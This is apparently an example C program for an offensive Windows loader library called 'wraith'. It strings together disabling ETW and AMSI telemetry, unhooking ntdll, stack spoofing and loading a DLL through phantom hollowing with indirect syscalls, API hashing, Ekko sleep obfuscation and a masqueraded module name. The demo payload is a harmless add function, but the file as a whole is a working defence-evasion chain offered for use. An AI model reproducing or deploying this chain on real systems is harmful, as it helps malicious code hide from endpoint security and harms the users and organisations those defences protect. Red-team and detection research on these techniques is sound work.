/*
 * examples/full_stealth_chain/main.c
 *
 * Showcase consumer demonstrating every classic-tier stealth flag in
 * one binary. Mirrors what the integration tests exercise individually,
 * but composed end-to-end so a reader can see the whole API in one
 * file.
 *
 * Usage:
 *   full_stealth_chain.exe [path-to-payload.dll]
 *
 * Expects a single-export DLL with `int addNumbers(int, int)` (the
 * bundled `payload.dll` works out of the box). It:
 *
 *   1. Patches ETW + AMSI for the host process.
 *   2. Loads the payload using PHANTOM_HOLLOWING + API_HASHING +
 *      INDIRECT_SYSCALLS + PEB_LINKAGE + SLEEP_OBFUSCATION.
 *   3. Calls the payload's export.
 *   4. Sleeps 600 ms with obfuscation; verifies the module still
 *      works after wake.
 *   5. Frees the module and reports timing.
 *
 * Build with the same profile as the library (recommended:
 * `paranoid-classic`).
 */

#include "wraith/wraith.h"
#include "wraith/wraith_stealth.h"

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <windows.h>

typedef int (*add_fn)(int, int);

static int read_all(const char *path, void **out_buf, size_t *out_size)
{
  FILE *fp = fopen(path, "rb");
  if (!fp) return -1;
  fseek(fp, 0, SEEK_END);
  long n = ftell(fp);
  fseek(fp, 0, SEEK_SET);
  if (n <= 0) { fclose(fp); return -1; }
  void *buf = malloc((size_t)n);
  if (!buf) { fclose(fp); return -1; }
  size_t r = fread(buf, 1, (size_t)n, fp);
  fclose(fp);
  if (r != (size_t)n) { free(buf); return -1; }
  *out_buf = buf;
  *out_size = (size_t)n;
  return 0;
}

int main(int argc, char **argv)
{
  const char *path = (argc > 1) ? argv[1] : "payload.dll";
  printf("[*] wraith example: full_stealth_chain (%s)\n",
  wraith_version());

  /* (1) Userland telemetry patches + stealth probes.
  * Each is best-effort - features compiled out report
  * WRAITH_E_FEATURE_DISABLED. */
  wraith_status_t r;
  r = wraith_patch_etw();
  printf("[*] ETW patch  : %s\n", wraith_status_string(r));
  r = wraith_patch_amsi();
  printf("[*] AMSI patch  : %s\n", wraith_status_string(r));
  r = wraith_stackspoof_probe();
  printf("[*] stack spoof       : %s\n", wraith_status_string(r));
  r = wraith_unhook_ntdll();
  printf("[*] ntdll unhook  : %s\n", wraith_status_string(r));

  /* (2) Read payload + load with full classic stealth flags. */
  void *bytes = NULL;
  size_t size = 0;
  if (read_all(path, &bytes, &size) != 0) {
  fprintf(stderr, "[!] cannot read %s\n", path);
  return 1;
  }

  wraith_load_options opt = {0};
  opt.map_strategy = WRAITH_MAP_PHANTOM_HOLLOW;
  opt.flags  = WRAITH_F_API_HASHING
  | WRAITH_F_INDIRECT_SYSCALLS
  | WRAITH_F_PEB_LINKAGE
  | WRAITH_F_SLEEP_OBFUSCATION
  | WRAITH_F_RELIABILITY_ALL;
  opt.sleep_algo  = WRAITH_SLEEP_EKKO;
  opt.masquerade  = L"systemcomp.dll";

  wraith_handle_t h = NULL;
  DWORD t0 = GetTickCount();
  r = wraith_load_library(bytes, size, &opt, &h);
  DWORD t1 = GetTickCount();

  if (r != WRAITH_OK) {
  fprintf(stderr, "[!] wraith_load_library -> %s (%s)\n",
  wraith_status_string(r), wraith_last_error());
  free(bytes);
  return 1;
  }
  printf("[*] loaded in %lums via PHANTOM_HOLLOW + masquerade=\"%ls\"\n",
  (unsigned long)(t1 - t0), opt.masquerade);

  /* (3) Resolve and call. */
  void *fn = NULL;
  if (wraith_get_proc_address(h, "addNumbers", &fn) != WRAITH_OK || !fn) {
  fprintf(stderr, "[!] addNumbers not found\n");
  wraith_free_library(h);
  free(bytes);
  return 1;
  }
  int sum = ((add_fn)fn)(1234, 5678);
  printf("[*] addNumbers(1234, 5678) = %d\n", sum);

  /* (4) Sleep with obfuscation, then call again. */
  printf("[*] sleeping 600ms with %s obfuscation ...\n",
  "ekko (xor-aliased)");
  r = wraith_sleep(h, 600);
  if (r != WRAITH_OK) {
  fprintf(stderr, "[!] wraith_sleep -> %s\n", wraith_status_string(r));
  wraith_free_library(h);
  free(bytes);
  return 1;
  }
  int sum2 = ((add_fn)fn)(2, 40);
  printf("[*] post-sleep addNumbers(2, 40) = %d\n", sum2);

  /* (5) Free + report. */
  wraith_free_library(h);
  free(bytes);
  printf("[*] released; chain demo complete.\n");
  return 0;
}
